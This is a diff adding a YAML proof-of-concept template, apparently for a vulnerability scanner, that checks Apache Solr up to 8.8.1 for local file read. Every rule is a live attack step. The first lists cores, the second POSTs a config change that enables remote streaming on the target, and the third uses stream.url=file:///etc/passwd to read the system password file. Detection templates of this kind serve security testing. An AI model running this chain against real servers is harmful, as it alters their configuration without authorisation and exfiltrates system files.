@@ -1,0 +1,47 @@
+name: poc-yaml-solr-lfi
+binding: b690c6f9-658d-477b-bfe2-431dd092a732
+manual: true
+detail:
+    author: yywing
+    links:
+        - https://mp.weixin.qq.com/s/1D4j7cF49yfrh1hErD_3OA
+    vulnerability:
+        id: CT-158741
+        level: high
+    version: <= 8.8.1
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /solr/admin/cores?wt=json
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(b"responseHeader")
+        output:
+            search: '''"name":"(?P<core>[^"]+)"''.bsubmatch(response.body)'
+            core: search["core"]
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /solr/{{core}}/config
+            headers:
+                Content-Type: application/json
+            body: |-
+                {
+                  "set-property":{
+                    "requestDispatcher.requestParsers.enableRemoteStreaming":true
+                  }
+                }
+        expression: response.status == 200 && response.body.bcontains(b"This response format is experimental")
+    r2:
+        request:
+            cache: true
+            method: POST
+            path: /solr/{{core}}/debug/dump?param=ContentStreams
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: stream.url=file:///etc/passwd
+        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+expression: r0() && r1() && r2()
